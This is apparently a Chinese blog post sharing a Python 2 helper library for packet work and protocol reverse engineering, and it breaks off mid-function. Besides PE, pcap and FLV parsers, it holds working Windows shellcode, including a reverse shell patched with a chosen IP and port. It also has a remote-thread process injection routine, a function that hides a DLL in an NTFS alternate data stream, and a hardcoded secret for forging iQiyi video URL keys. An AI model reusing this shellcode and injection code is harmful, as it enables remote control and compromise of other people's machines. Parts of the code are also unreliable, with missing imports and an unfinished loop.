> 这个用起来好像还是挺麻烦的，要自己去connect、send和recv，但是为了更灵活的跟服务器交互（中间涉及到一些协议的加解密破解），所以有了这个函数集。。。

python发包比较麻烦，但是python用起来比c方便，在windows下我习惯用它和服务器交互，验证自己的一些想法，所以就有了这个用于python打包发包的小函数
使用时就是在python shell中import即可

```
import binascii
import ctypes
import sys
import struct
import socket
import string
import gzip
import StringIO
import hashlib
import time

pcapheaderlen = 24

##############################shellcode######################################
def getkillpidshellcode(pid):
    shellcode = "\xfc\xe8\x44\x00\x00\x00\x8b\x45\x3c\x8b\x7c\x05\x78\x01\xef\x8b" \
                "\x4f\x18\x8b\x5f\x20\x01\xeb\x49\x8b\x34\x8b\x01\xee\x31\xc0\x99" \
                "\xac\x84\xc0\x74\x07\xc1\xca\x0d\x01\xc2\xeb\xf4\x3b\x54\x24\x04" \
                "\x75\xe5\x8b\x5f\x24\x01\xeb\x66\x8b\x0c\x4b\x8b\x5f\x1c\x01\xeb" \
                "\x8b\x1c\x8b\x01\xeb\x89\x5c\x24\x04\xc3\x31\xc0\x64\x8b\x40\x30" \
                "\x85\xc0\x78\x0c\x8b\x40\x0c\x8b\x70\x1c\xad\x8b\x68\x08\xeb\x09" \
                "\x8b\x80\xb0\x00\x00\x00\x8b\x68\x3c\x5f\x31\xf6\x60\x56\x89\xf8" \
                "\x83\xc0\x7b\x50\x68\xef\xce\xe0\x60\x68\x98\xfe\x8a\x0e\x57\xff" \
                "\xe7\x63\x6d\x64\x2e\x65\x78\x65\x20\x2f\x63\x20\x74\x61\x73\x6b" \
                "\x6b\x69\x6c\x6c\x20\x2f\x50\x49\x44\x20\x31\x32\x33\x34\x00"
    padding = 4 - len(pid)
    replacevalue = pid + ("\x00" * padding)
    replacestr = "\x31\x32\x33\x34"
    shellcode = shellcode.replace(replacestr, replacevalue)
    return shellcode

def getmessageboxkillshellcode():
    shellcode = "\x31\xd2\xb2\x30\x64\x8b\x12\x8b\x52\x0c\x8b\x52\x1c\x8b\x42"\
                "\x08\x8b\x72\x20\x8b\x12\x80\x7e\x0c\x33\x75\xf2\x89\xc7\x03"\
                "\x78\x3c\x8b\x57\x78\x01\xc2\x8b\x7a\x20\x01\xc7\x31\xed\x8b"\
                "\x34\xaf\x01\xc6\x45\x81\x3e\x46\x61\x74\x61\x75\xf2\x81\x7e"\
                "\x08\x45\x78\x69\x74\x75\xe9\x8b\x7a\x24\x01\xc7\x66\x8b\x2c"\
                "\x6f\x8b\x7a\x1c\x01\xc7\x8b\x7c\xaf\xfc\x01\xc7\x68\x21\x21"\
                "\x21\x01\x68\x6f\x62\x69\x6e\x68\x20\x64\x65\x6d\x89\xe1\xfe"\
                "\x49\x0b\x31\xc0\x51\x50\xff\xd7"
    return shellcode

def getreverseshellcode(ip, port):
    shellcode = "\xfc\x6a\xeb\x4d\xe8\xf9\xff\xff\xff\x60\x8b\x6c\x24\x24\x8b\x45" \
                "\x3c\x8b\x7c\x05\x78\x01\xef\x8b\x4f\x18\x8b\x5f\x20\x01\xeb\x49" \
                "\x8b\x34\x8b\x01\xee\x31\xc0\x99\xac\x84\xc0\x74\x07\xc1\xca\x0d" \
                "\x01\xc2\xeb\xf4\x3b\x54\x24\x28\x75\xe5\x8b\x5f\x24\x01\xeb\x66" \
                "\x8b\x0c\x4b\x8b\x5f\x1c\x01\xeb\x03\x2c\x8b\x89\x6c\x24\x1c\x61" \
                "\xc3\x31\xdb\x64\x8b\x43\x30\x8b\x40\x0c\x8b\x70\x1c\xad\x8b\x40" \
                "\x08\x5e\x68\x8e\x4e\x0e\xec\x50\xff\xd6\x66\x53\x66\x68\x33\x32" \
                "\x68\x77\x73\x32\x5f\x54\xff\xd0\x68\xcb\xed\xfc\x3b\x50\xff\xd6" \
                "\x5f\x89\xe5\x66\x81\xed\x08\x02\x55\x6a\x02\xff\xd0\x68\xd9\x09" \
                "\xf5\xad\x57\xff\xd6\x53\x53\x53\x53\x43\x53\x43\x53\xff\xd0\x68" \
                "\xc0\xa8\x01\x02\x66\x68\x04\xd2\x66\x53\x89\xe1\x95\x68\xec\xf9" \
                "\xaa\x60\x57\xff\xd6\x6a\x10\x51\x55\xff\xd0\x66\x6a\x64\x66\x68" \
                "\x63\x6d\x6a\x50\x59\x29\xcc\x89\xe7\x6a\x44\x89\xe2\x31\xc0\xf3" \
                "\xaa\x95\x89\xfd\xfe\x42\x2d\xfe\x42\x2c\x8d\x7a\x38\xab\xab\xab" \
                "\x68\x72\xfe\xb3\x16\xff\x75\x28\xff\xd6\x5b\x57\x52\x51\x51\x51" \
                "\x6a\x01\x51\x51\x55\x51\xff\xd0\x68\xad\xd9\x05\xce\x53\xff\xd6" \
                "\x6a\xff\xff\x37\xff\xd0\x68\xe7\x79\xc6\x79\xff\x75\x04\xff\xd6" \
                "\xff\x77\xfc\xff\xd0\x68\xef\xce\xe0\x60\x53\xff\xd6\xff\xd0"
    portold = "\x04\xd2"
    portnew = struct.pack('!h', port)
    shellcode = shellcode.replace(portold, portnew)
    ipold = "\xc0\xa8\x01\x02"
    ipnew = struct.pack('!I', socket.ntohl(struct.unpack("I", socket.inet_aton(str(ip)))[0]))
    shellcode = shellcode.replace(ipold, ipnew)
    return shellcode

########################pe file decode###############################
STRUCT_SIZEOF_TYPES = {
    'x': 1, #pading, no value
    'c': 1, #char
    'b': 1, #byte, signed char
    'B': 1, #byte, unsigned char
    'h': 2, #short
    'H': 2, #unsigned short
    'i': 4, #int
    'I': 4, #unsigned int
    'l': 4, #long
    'L': 4, #unsigned long
    'f': 4, #float
    'q': 8, #long long
    'Q': 8, #unsigned long long
    'd': 8, #double
    's': 1, #string, 'ns' char[n]
    'P': 4  #void *, long
    }
__IMAGE_DOS_HEADER_FORMAT__ = ('IMAGE_DOS_HEADER',(
     'H,magic',    #signature
     'H,cblp',     #last page size
     'H,cp',       #total pages in file
     'H,crlc',     #relocation items
     'H,cparhdr',  #paragraphs in header
     'H,minalloc', #minimun extra paragraphs
     'H,maxalloc', #maximun extra paragraphs
     'H,ss',       #initial SS
     'H,sp',       #initial sp
     'H,csum',     #complemented checksum
     'H,ip',       #initial IP
     'H,cs',       #initial CS
     'H,relopos',  #relocation table offset
     'H,ovno',     #overlay number
     '8s,res',      #reserved
     'H,oemid',    #oem id
     'H,oeminfo',  #oem info
     '20s,res2',    #reserved
     'I,lfanew'))  #point to __IMAGE_FILE_HEADER__

__IMAGE_FILE_HEADER_FORMAT__ = ('IMAGE_FILE_HEADER',(
     'H,Machine',               #arch
     'H,NumberOfSections',      #sections num
     'I,TimeDateStamp',         #timestamp
     'I,PointerToSymbolTable',  #0
     'I,NumberOfSymbols',       #0
     'H,SizeOfOptionalHeader',  #image option header size
     'H,Characteristics'))      #image file type info

__IMAGE_DATA_DIRECTORY_FORMAT__ = ('IMAGE_DATA_DIRECTORY',(
     'I,VirtualAddress',
     'I,Size'))

__IMAGE_OPTIONAL_HEADER_FORMAT__ = ('IMAGE_OPTIONAL_HEADER',(
     'H,Magic',                         #magic num 0x10b
     'B,MajorLinkerVersion',            #major link version
     'B,MinorLinkerVersion',            #minor link version
     'I,SizeOfCode',                    #size of code section
     'I,SizeOfInitializedData',         #size of initial data section
     'I,SizeOfUninitializedData',       #size of uninitial data section
     'I,AddressOfEntryPoint',           #entry point address
     'I,BaseOfCode',                    #point to begining of code section
     'I,BaseOfData',                    #point to begining of data section
     'I,ImageBase',                     #prefered address of image when load in memory
     'I,SectionAlignment',              #alignment of sections loaded in memory
     'I,FileAlignment',                 #alignment of the raw data of sections in the image file
     'H,MajorOperatingSystemVersion',   #major version of the required system
     'H,MinorOperatingSystemVersion',   #minor version of the required system
     'H,MajorImageVersion',             #major version of the image
     'H,MinorImageVersion',             #minor version of the image
     'H,MajorSubsystemVersion',         #major version of subsystem
     'H,MinorSubsystemVersion',         #minor version of subsystem
     'I,Reserved1',                     #0
     'I,SizeOfImage',                   #size of the image
     'I,SizeOfHeaders',                 #dosheader.lfanew + 4('PE\x00\x00') + fileheader + optionheader + sectionheader * sectioncount
     'I,CheckSum',                      #iamge checksum
     'H,Subsystem',                     #subsystem
     'H,DllCharacteristics',            #dll attribute
     'I,SizeOfStackReserve',            #bytes to reserve for stack
     'I,SizeOfStackCommit',             #bytes to commit for stack
     'I,SizeOfHeapReserve',             #bytes to reserve for local heap
     'I,SizeOfHeapCommit',              #bytes to commit for local heap
     'I,LoaderFlags',                   #0
     'I,NumberOfRvaAndSizes' ))         #directory entries in remainder of the optional header


__IMAGE_OPTIONAL_HEADER64_FORMAT__ = ('IMAGE_OPTIONAL_HEADER64',(
    'H,Magic',
    'B,MajorLinkerVersion',
    'B,MinorLinkerVersion',
    'I,SizeOfCode',
    'I,SizeOfInitializedData',
    'I,SizeOfUninitializedData',
    'I,AddressOfEntryPoint',
    'I,BaseOfCode',
    'Q,ImageBase',
    'I,SectionAlignment',
    'I,FileAlignment',
    'H,MajorOperatingSystemVersion',
    'H,MinorOperatingSystemVersion',
    'H,MajorImageVersion',
    'H,MinorImageVersion',
    'H,MajorSubsystemVersion',
    'H,MinorSubsystemVersion',
    'I,Reserved1',
    'I,SizeOfImage',
    'I,SizeOfHeaders',
    'I,CheckSum',
    'H,Subsystem',
    'H,DllCharacteristics',
    'Q,SizeOfStackReserve',
    'Q,SizeOfStackCommit',
    'Q,SizeOfHeapReserve',
    'Q,SizeOfHeapCommit',
    'I,LoaderFlags',
    'I,NumberOfRvaAndSizes' ))

__IMAGE_NT_HEADERS_FORMAT__ = ('IMAGE_NT_HEADERS', (
    'I,Signature',))

__IMAGE_SECTION_HEADER_FORMAT__ = ('IMAGE_SECTION_HEADER',(
    '8s,Name',
    'I,Misc_PhyAddr_VirtSize',
    'I,VirtualAddress',
    'I,SizeOfRawData',
    'I,PointerToRawData',
    'I,PointerToRelocations',
    'I,PointerToLinenumbers',
    'H,NumberOfRelocations',
    'H,NumberOfLinenumbers',
    'I,Characteristics'))

__IMAGE_DELAY_IMPORT_DESCRIPTOR_FORMAT__ = ('IMAGE_DELAY_IMPORT_DESCRIPTOR',(
    'I,grAttrs',
    'I,szName',
    'I,phmod',
    'I,pIAT',
    'I,pINT',
    'I,pBoundIAT',
    'I,pUnloadIAT',
    'I,dwTimeStamp'))

__IMAGE_IMPORT_DESCRIPTOR_FORMAT__ =  ('IMAGE_IMPORT_DESCRIPTOR',(
    'I,Misc_OrigThunk_Attr',
    'I,TimeDateStamp',
    'I,ForwarderChain',
    'I,Name',
    'I,FirstThunk'))

__IMAGE_EXPORT_DIRECTORY_FORMAT__ =  ('IMAGE_EXPORT_DIRECTORY',(
    'I,Characteristics',
    'I,TimeDateStamp',
    'H,MajorVersion',
    'H,MinorVersion',
    'I,Name',
    'I,Base',
    'I,NumberOfFunctions',
    'I,NumberOfNames',
    'I,AddressOfFunctions',
    'I,AddressOfNames',
    'I,AddressOfNameOrdinals'))

__IMAGE_RESOURCE_DIRECTORY_FORMAT__ = ('IMAGE_RESOURCE_DIRECTORY',(
    'I,Characteristics',
    'I,TimeDateStamp',
    'H,MajorVersion',
    'H,MinorVersion',
    'H,NumberOfNamedEntries',
    'H,NumberOfIdEntries'))

__IMAGE_RESOURCE_DIRECTORY_ENTRY_FORMAT__ = ('IMAGE_RESOURCE_DIRECTORY_ENTRY',(
    'I,Name',
    'I,OffsetToData'))

__IMAGE_RESOURCE_DATA_ENTRY_FORMAT__ = ('IMAGE_RESOURCE_DATA_ENTRY',(
    'I,OffsetToData',
    'I,Size',
    'I,CodePage',
    'I,Reserved'))

__VS_VERSIONINFO_FORMAT__ = ('VS_VERSIONINFO',(
    'H,Length',
    'H,ValueLength',
    'H,Type' ))

__VS_FIXEDFILEINFO_FORMAT__ = ('VS_FIXEDFILEINFO',(
    'I,Signature',
    'I,StrucVersion',
    'I,FileVersionMS',
    'I,FileVersionLS',
    'I,ProductVersionMS',
    'I,ProductVersionLS',
    'I,FileFlagsMask',
    'I,FileFlags',
    'I,FileOS',
    'I,FileType',
    'I,FileSubtype',
    'I,FileDateMS',
    'I,FileDateLS'))

__StringFileInfo_FORMAT__ = ('StringFileInfo',(
    'H,Length',
    'H,ValueLength',
    'H,Type' ))

__StringTable_FORMAT__ = ('StringTable',(
    'H,Length',
    'H,ValueLength',
    'H,Type' ))

__String_FORMAT__ = ('String',(
    'H,Length',
    'H,ValueLength',
    'H,Type' ))

__Var_FORMAT__ = ('Var', (
    'H,Length',
    'H,ValueLength',
    'H,Type' ))

__IMAGE_THUNK_DATA_FORMAT__ = ('IMAGE_THUNK_DATA',(
    'I,ThunkData',))

__IMAGE_THUNK_DATA64_FORMAT__ = ('IMAGE_THUNK_DATA',
    ('Q,ThunkData64',))

__IMAGE_DEBUG_DIRECTORY_FORMAT__ = ('IMAGE_DEBUG_DIRECTORY',(
    'I,Characteristics',
    'I,TimeDateStamp',
    'H,MajorVersion',
    'H,MinorVersion',
    'I,Type',
    'I,SizeOfData',
    'I,AddressOfRawData',
    'I,PointerToRawData'))

__IMAGE_BASE_RELOCATION_FORMAT__ = ('IMAGE_BASE_RELOCATION',(
    'I,VirtualAddress',
    'I,SizeOfBlock') )

__IMAGE_BASE_RELOCATION_ENTRY_FORMAT__ = ('IMAGE_BASE_RELOCATION_ENTRY',(
    'H,Data',) )

__IMAGE_TLS_DIRECTORY_FORMAT__ = ('IMAGE_TLS_DIRECTORY',(
    'I,StartAddressOfRawData',
    'I,EndAddressOfRawData',
    'I,AddressOfIndex',
    'I,AddressOfCallBacks',
    'I,SizeOfZeroFill',
    'I,Characteristics' ) )

__IMAGE_TLS_DIRECTORY64_FORMAT__ = ('IMAGE_TLS_DIRECTORY',(
    'Q,StartAddressOfRawData',
    'Q,EndAddressOfRawData',
    'Q,AddressOfIndex',
    'Q,AddressOfCallBacks',
    'I,SizeOfZeroFill',
    'I,Characteristics' ) )

__IMAGE_LOAD_CONFIG_DIRECTORY_FORMAT__ = ('IMAGE_LOAD_CONFIG_DIRECTORY',(
    'I,Size',
    'I,TimeDateStamp',
    'H,MajorVersion',
    'H,MinorVersion',
    'I,GlobalFlagsClear',
    'I,GlobalFlagsSet',
    'I,CriticalSectionDefaultTimeout',
    'I,DeCommitFreeBlockThreshold',
    'I,DeCommitTotalFreeThreshold',
    'I,LockPrefixTable',
    'I,MaximumAllocationSize',
    'I,VirtualMemoryThreshold',
    'I,ProcessHeapFlags',
    'I,ProcessAffinityMask',
    'H,CSDVersion',
    'H,Reserved1',
    'I,EditList',
    'I,SecurityCookie',
    'I,SEHandlerTable',
    'I,SEHandlerCount',
    'I,GuardCFCheckFunctionPointer',
    'I,Reserved2',
    'I,GuardCFFunctionTable',
    'I,GuardCFFunctionCount',
    'I,GuardFlags' ) )

__IMAGE_LOAD_CONFIG_DIRECTORY64_FORMAT__ = ('IMAGE_LOAD_CONFIG_DIRECTORY',(
    'I,Size',
    'I,TimeDateStamp',
    'H,MajorVersion',
    'H,MinorVersion',
    'I,GlobalFlagsClear',
    'I,GlobalFlagsSet',
    'I,CriticalSectionDefaultTimeout',
    'Q,DeCommitFreeBlockThreshold',
    'Q,DeCommitTotalFreeThreshold',
    'Q,LockPrefixTable',
    'Q,MaximumAllocationSize',
    'Q,VirtualMemoryThreshold',
    'Q,ProcessAffinityMask',
    'I,ProcessHeapFlags',
    'H,CSDVersion',
    'H,Reserved1',
    'Q,EditList',
    'Q,SecurityCookie',
    'Q,SEHandlerTable',
    'Q,SEHandlerCount',
    'Q,GuardCFCheckFunctionPointer',
    'Q,Reserved2',
    'Q,GuardCFFunctionTable',
    'Q,GuardCFFunctionCount',
    'I,GuardFlags' ) )

__IMAGE_BOUND_IMPORT_DESCRIPTOR_FORMAT__ = ('IMAGE_BOUND_IMPORT_DESCRIPTOR',(
    'I,TimeDateStamp',
    'H,OffsetModuleName',
    'H,NumberOfModuleForwarderRefs'))

__IMAGE_BOUND_FORWARDER_REF_FORMAT__ = ('IMAGE_BOUND_FORWARDER_REF',(
    'I,TimeDateStamp',
    'H,OffsetModuleName',
    'H,Reserved') )

##########################my struct class################################
class MyStruct:
    
    def __init__(self, format, name=None):
        
        #intel, little endian
        self.__FORMAT__ = '<'
        self.__keys__ = []
        self.__types__ = []
        self.__FORMAT__length__ = 0
        self.__field_offset__ = dict()
        self.__all_zero__ = False
        self.__unpacked_data__ = None
        if name:
            self.name = name
        else:
            self.name = format[0]
        self.__set_FORMAT__(format[1])
        
    def __set_FORMAT__(self, fmt):
        offset = 0
        for fmttmp in fmt:
            if ',' in fmttmp:
                tmptype, tmpname = fmttmp.split(',', 1)
                if len(tmptype) > 1 and tmptype[-2] not in string.digits:
                        raise "FORMAT %s %s's type: <%s> is not support" % (self.name, tmpname, tmptype)
                self.__FORMAT__ += tmptype
                self.__types__.append(tmptype)
                self.__field_offset__[tmpname] = offset
                offset += self.sizeof_type(tmptype)
                self.__keys__.append(tmpname)
        self.__format_length__ = struct.calcsize(self.__FORMAT__)

    def get_keys(self):
        return self.__keys__

    def get_key_value(self, key):
        if self.__unpacked_data__ == None:
            return None
        else:
            return getattr(self, key)
    
    def get_key_offset(self, field_name):
        """Return the offset within the structure for the requested field."""
        return self.__field_offset__[field_name]

    def all_zero(self):
        """Returns true is the unpacked data is all zeros."""
        return self.__all_zero__
    
    def sizeof_type(self, stype):
        count = 1
        typetmp = stype[-1]
        if stype[0] in string.digits:
            count = int(''.join([d for d in stype if d in string.digits]))
        return STRUCT_SIZEOF_TYPES[typetmp] * count

    def sizeof(self):
        return self.__format_length__

    def unpack(self, data):

        if len(data) > self.__format_length__:
            data = data[:self.__format_length__]
        elif len(data) < self.__format_length__:
            raise "UNPACK data failed, data len less then expect len"

        if data.count(chr(0)) == len(data):
            self.__all_zero__ = True

        self.__unpacked_data__ = struct.unpack(self.__FORMAT__, data)
        
        for i, key in enumerate(self.__keys__):
            #self.values[key] = self.__unpacked_data__[i]
            setattr(self, key, self.__unpacked_data__[i])    

    def pack(self):

        new_values = []
        for i in xrange(len(self.__unpacked_data__)):

            for key in self.__keys__[i]:
                new_val = getattr(self, key)
                old_val = self.__unpacked_data__[i]

                # In the case of Unions, when the first changed value
                # is picked the loop is exited
                if new_val != old_val:
                    break

            new_values.append(new_val)

        return struct.pack(self.__FORMAT__, *new_values)

    def printstruct(self):
        print self.name
        print '--------------------------------'
        for i, key in enumerate(self.__keys__):
            if 's' in self.__types__[i]:
                print key, "%s" % getattr(self, key)
            else:
                print key, "0x%x" % getattr(self, key)
        print '--------------------------------'

#######################pe file decode################################
def pefiledecode(filename):
    fd = open(filename, 'rb')

    #image dos header handle
    doshdr = MyStruct(__IMAGE_DOS_HEADER_FORMAT__)
    data = fd.read(doshdr.sizeof())
    doshdr.unpack(data)
    doshdr.printstruct()

    #check pe
    fd.seek(getattr(doshdr, 'lfanew'), 0)
    data = fd.read(4)
    if data != 'PE\x00\x00':
        print 'not a pe file'
        fd.close()
        return

    #image file header handle
    filehdr = MyStruct(__IMAGE_FILE_HEADER_FORMAT__)
    data = fd.read(filehdr.sizeof())
    filehdr.unpack(data)
    filehdr.printstruct()

    #iamge option header handle
    opthdr = MyStruct(__IMAGE_OPTIONAL_HEADER_FORMAT__)
    data = fd.read(opthdr.sizeof())
    opthdr.unpack(data)
    opthdr.printstruct()

    #image section handle
    sectioncount = getattr(opthdr, 'NumberOfRvaAndSizes')
    while sectioncount > 0:
        sectioncount -= 1

        
    
    fd.close()
    #

##########################iqiyi url md5##############################
def getiqiyiurlkey(hashid):
    if len(hashid) != 32:
        print 'hashid error'
        return None
    t = int(time.time())/600
    key = '%ld%s%c%s'%(t, ")(*&^flash@#$%", 'a', hashid)
    print key
    return hashlib.md5(key).hexdigest()

############################iqiyi url###############################
def getiqiyiurl(l):
    #if not l.endswith('.f4v'):
    #    print 'l error'
    #    return None
    #hashid = l[-36:-4]
    hashid = l[(l.rfind('/') + 1):l.rfind('.')]
    return 'http://data.video.qiyi.com/%s/videos%s'%(getiqiyiurlkey(hashid),l)

###########################gzip decode###############################
def gzdecode(data) :  
    compressedstream = StringIO.StringIO(data)  
    gziper = gzip.GzipFile(fileobj=compressedstream)    
    ret = gziper.read() 
    return ret 

######################str display format#############################
def dspfmt(data, fmt):
    fmtarray = fmt.split(',')
    offset = 0
    datalen = len(data)
    print '-----------------------------start---------------------------------'
    while offset < datalen:
        ret = ''
        for tmp in fmtarray:
            tmp = tmp.strip()
            if offset >= datalen:
                break
            if tmp.isdigit():
                ret += data[offset:(offset + int(tmp) * 2)]
                offset += int(tmp) * 2
            elif tmp == 'i':
                ret += 'int:%10d'%(string.atoi(data[offset:(offset + 8)], 16))
                offset += 8
            elif tmp == '!i':
                ret += 'int:%10d'%(socket.htonl(string.atoi(data[offset:(offset + 8)], 16)))
                offset += 8
            elif tmp == 'h':
                ret += 'short:%5d'%(string.atoi(data[offset:(offset + 4)], 16))
                offset += 4
            elif tmp == '!h':
                ret += 'short:%5d'%(socket.htons(string.atoi(data[offset:(offset + 4)], 16)))
                offset += 4
            elif tmp == 'b':
                ret += 'byte:%3d'%(string.atoi(data[offset:(offset + 2)], 16))
                offset += 2
            elif tmp == '!b':
                ret += 'byte:%3d'%(socket.htons(string.atoi(data[offset:(offset + 2)], 16)))
                offset += 2
            elif tmp == 'ip':
                ret += 'ip:%15s'%socket.inet_ntoa(struct.pack('I', string.atoi(data[offset:(offset+8)], 16)))
                offset += 8
            elif tmp == '!ip':
                ret += 'ip:%15s'%socket.inet_ntoa(struct.pack('I', socket.htonl(string.atoi(data[offset:(offset+8)], 16))))
                offset += 8
            elif tmp == 'port':
                ret += 'port:%5d'%(string.atoi(data[offset:(offset + 4)], 16))
                offset += 4
            elif tmp == '!port':
                ret += 'port:%5d'%(socket.htons(string.atoi(data[offset:(offset + 4)], 16)))
                offset += 4
            elif tmp.endswith('s'):
                nchr = int(tmp[:-1])
                offset2 = 0
                while offset2 < nchr:
                    if offset >= datalen:
                        break
                    ret += '%c'%(string.atoi(data[offset:(offset + 2)], 16))
                    offset += 2
                    offset2 += 1
            else:
                return 'format string error'
            ret += ' '
        print ret            

##################### pps byte xor decode############################
def ppsdecodebytexor(src, ishex):
    if ishex:
        srchex = src
    else:
        srchex = binascii.a2b_hex(src)
    tmpdst = []
    length = len(srchex)
    if length > 0x80:
        length = 0x80
    index = 3
    while index < length - 1:
        tmpdst.append("%02x"%(ord(srchex[index])^ord(srchex[index - 1])))
        index += 1
    dst = "%02x%02x%02x" % ((ord(srchex[0]) & 0xff) ^ord(srchex[length - 1]), ord(srchex[1]) & 0x7f, ord(srchex[2])^ord(srchex[0]))
    return dst + ''.join(tmpdst) + ("%02x" %ord(srchex[length - 1]))

############################checksum##################################
def carry_around_add(a, b):
    c = a + b
    return (c & 0xffff) + (c >> 16)

def checksum(msg):
    csum = 0
    for i in range(0, len(msg), 2):
        w = ord(msg[i]) + (ord(msg[i+1]) << 8)
        csum = carry_around_add(csum, w)
    return ~csum & 0xffff
    
#########################pcap get data################################
def pcapgetdata(filename, cnt = 10, index = 0, start = 0, dsplen = 0, pps = 0):
    fd = open(filename, "rb")
    offset = pcapheaderlen
    count = 0
    i = 0
    ret = []
    while count < cnt:
        offset += 8#GTime, MTime
        fd.seek(offset, 0)
        pktlenstr = fd.read(4)
        if pktlenstr == '':
            break
        pktlen = struct.unpack('I', pktlenstr)[0]
        offset += 8#pcap len, header len
        fd.seek(offset, 0)
        data = fd.read(pktlen)
        if data == '':
            break
        offset += pktlen
        
        i += 1
        if i < index:
            continue
        count += 1
        
        if pps:
            if dsplen == 0:
                tmp = ppsdecodebytexor(data[42:], 1)[(start * 2):]
                print tmp
                ret.append(tmp)
            else:
                tmp = ppsdecodebytexor(data[42:], 1)[(start * 2):(start * 2 + dsplen * 2)]
                print tmp
                ret.append(tmp)
        else:
            if dsplen == 0:
                tmp = binascii.hexlify(data[(42 + start):])
                print tmp
                ret.append(tmp)
            else:
                tmp = binascii.hexlify(data[(42 + start):(42 + start + dsplen)])
                print tmp
                ret.append(tmp)
    fd.close()
    #return ret

#########################flv decode##################################
def flvdecode(filename):
    offset = 0
    fd = open(filename, "rb")
    
    data = fd.read(9)
    filetype, version, isvideosound, headerlen = struct.unpack(">3sbbi", data)

    print "file type: %s" % (filetype)
    print "version: %d" % (version)
    if isvideosound | 0x0100 and isvideosound | 0x0001:
        isvideosoundstr = 'have video and sound'
    elif isvideosound | 0x0001:
        isvideosoundstr = 'have video'
    elif isvideosound | 0x0100:
        isvideosoundstr = 'have sound'
    else:
        isvideosoundstr = 'no sound or video'
    print "is video or sound: %s" % (isvideosoundstr)
    print "header len: %d" % (headerlen)
    
    offset += 9#header len
    offset += 4#first tag size,  awalys 0
    
    i = 0
    while i < 5:
        i += 1
        #flv tag
        print "-------new tag--------"
        fd.seek(offset, 0)
        data = fd.read(11)
        tagtype, datasize, timetamp, timetampex, streamid = struct.unpack(">b3s3sb3s", data)
        if tagtype == 0x8:
            tagtypestr = "audio"
        elif tagtype == 0x9:
            tagtypestr = "video"
        elif tagtype == 0x12:
            tagtypestr = "script"
        else:
            tagtypestr = "error"
        print "tag type: %s" % tagtypestr
        sizetupe = struct.unpack("BBB", datasize)
        datasizeint = (sizetupe[0]<<(8 * 2)) + (sizetupe[1]<<(8)) + sizetupe[2]
        timetupe = struct.unpack("BBB", timetamp)
        timetampint = (timetupe[0]<<(8 * 2)) + (timetupe[1]<<(8)) + timetupe[2]
        print "tag data size: %d" % datasizeint
        print "tag time tamp: %d" % timetampint
        print "tag time tamp ex: %d" % timetampex
        print "tag stream id: 0"

        offset += 11
        #tag data handle
        fd.seek(offset, 0)
        data = fd.read(datasizeint)
        if tagtype == 0x8:
            fmt = "B%ds" % (datasizeint - 1)
            datainfo = struct.unpack(fmt, data)[0]
            format = datainfo & 0xf0
            rate = datainfo & 0x0c
            sampling = datainfo & 0x02
            audiotype = datainfo & 0x01
            print "data format: %d" %format
            print "audio rate: %d" %rate
            print "audio sampling: %d" %sampling
            print "audio type: %d" %audiotype
        elif tagtype == 0x9:
            fmt = "B%ds" % (datasizeint - 1)
            datainfo = struct.unpack(fmt, data)[0]
            frametype = datainfo & 0xf0
            codecid = datainfo & 0x0f
            print "frame type: %d" %frametype
            print "codec id: %d" %codecid
        elif tagtype == 0x12:
            pass
        
        offset += datasizeint
        fd.seek(offset, 0)
        data = fd.read(4)
        tagsize = struct.unpack("!I", data)
        print "tag size: %d" % tagsize
        offset += 4
    
    fd.close()

########################byte xor decode##############################
def decodebytexor(src, key):
    srchex = binascii.a2b_hex(src)
    tmpdst = []
    for tmphex in srchex:
        tmpdst.append("%02x"%(ord(tmphex)^key))
    return ''.join(tmpdst)

##########################list all process pid##################################
__metaclass__ = type
class PROCESSENTRY32(ctypes.Structure):
    _fields_ = [
            ("dwSize", ctypes.c_ulong),
            ("cntUsage", ctypes.c_ulong),
            ("th32ProcessID", ctypes.c_ulong),
            ("th32DefaultHeapID", ctypes.c_void_p),
            ("th32ModuleID", ctypes.c_ulong),
            ("cntThreads", ctypes.c_ulong),
            ("th32ParentProcessID", ctypes.c_ulong),
            ("pcPriClassBase", ctypes.c_long),
            ("dwFlags", ctypes.c_ulong),
            ("szExeFile", ctypes.c_char*260) 
        ]

def getprocess():
    kernel32 = ctypes.windll.LoadLibrary("kernel32.dll")
    phandler = kernel32.CreateToolhelp32Snapshot(0x2, 0x0)
    if phandler == -1:
        return -1
    proc = PROCESSENTRY32()
    proc.dwSize = ctypes.sizeof(proc)
    proclist = []
    while kernel32.Process32Next(phandler, ctypes.byref(proc)):
        (procname, pid) = ctypes.string_at(proc.szExeFile), proc.th32ProcessID
        print ("procname: %s, pid: %d" % (procname, pid))
        proclist.append((procname, pid))
    kernel32.CloseHandle(phandler)

#####################inject process and kill a process######################
def inject(pid, data, injecttype):
    PAGE_EXECUTE_READWRITE = 0x40
    PROCESS_ALL_ACCESS = (0x000F0000 | 0x00100000 | 0xfff)
    VIRTUAL_MEM = (0x1000 | 0x2000)

    #get process handler
    procHandler = ctypes.windll.kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, int(pid))
    if not procHandler:
        print "couldn't acquire a handle to pid: %s" % pid
        sys.exit(0)

    #allocte mem for shellcode
    argAddr = ctypes.windll.kernel32.VirtualAllocEx(procHandler, 0, len(data), VIRTUAL_MEM, PAGE_EXECUTE_READWRITE)

    #write shellcode
    written = ctypes.c_int(0)
    ctypes.windll.kernel32.WriteProcessMemory(procHandler, argAddr, data, len(data), ctypes.byref(written))

    #or, if dll inject, search for "kernel32.dll" from dst process
    #because WriteProcessMemory is hook by 

    #create remote process and set point to shellcode
    tid = ctypes.c_ulong(0)
    if not injecttype:
        startAddr = argAddr
    else:
        kernelHandler = ctypes.windll.kernel32.GetModuleHandleA("kernel32.dll")
        startAddr = ctypes.windll.kernel32.GetProcAddress(kernelHandler, "LoadLibraryA")
        injecttype = argAddr
        
    if not ctypes.windll.kernel32.CreateRemoteThread(procHandler, None, 0, startAddr, injecttype, 0, ctypes.byref(tid)):
        print "failed to inject process killer shellcode"
        sys.exit(0)

    print "process inject success"

###########################write to ads stream file##################################
def writedlltofileads(dll, dst):
    fd = open(dll, 'rb')
    data = fd.read()
    fd.close()

    fd = open("%s:%s" %(dst, dll), 'wb')
    fd.write(data)
    fd.close()

##############################network#######################################
def gettransctionid():
    tranId =''
    for i in xrange(32):
        tranId += random.choice('0123456789ABCDEF')
    return binascii.a2b_hex(tranId)
           
def gethostip(host):
    try:
        ip = socket.gethostbyname(host)
        #ipList  = socket.gethostbyname_ex(socket.gethostname())[2]
        print "gethostbyname " + host + ": " + ip
        return ip
    except:
        print "gethostbyname failed...\ncheck if host is online uself plz..."
        traceback.print_exc()
        return ''

TIMEOUT = 1

def getbindsocket(port):
